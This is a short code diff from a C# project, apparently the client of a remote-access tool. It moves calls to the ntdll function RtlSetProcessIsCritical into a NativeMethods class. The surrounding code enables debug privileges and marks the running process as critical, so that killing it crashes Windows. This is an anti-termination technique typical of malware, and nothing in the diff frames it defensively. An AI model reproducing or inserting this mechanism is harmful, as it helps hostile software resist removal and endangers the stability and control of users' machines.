@@ -20,7 +20,7 @@ namespace Client.Helper
             {
                 SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
                 Process.EnterDebugMode();
-                RtlSetProcessIsCritical(1, 0, 0);
+                Helper.NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
             }
             catch { }
         }
@@ -28,7 +28,7 @@ namespace Client.Helper
         {
             try
             {
-                RtlSetProcessIsCritical(0, 0, 0);
+                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
             }
             catch
             {
@@ -38,10 +38,5 @@ namespace Client.Helper
                 }
             }
         }
-
-        #region "Native Methods"
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
-        #endregion
     }
 }
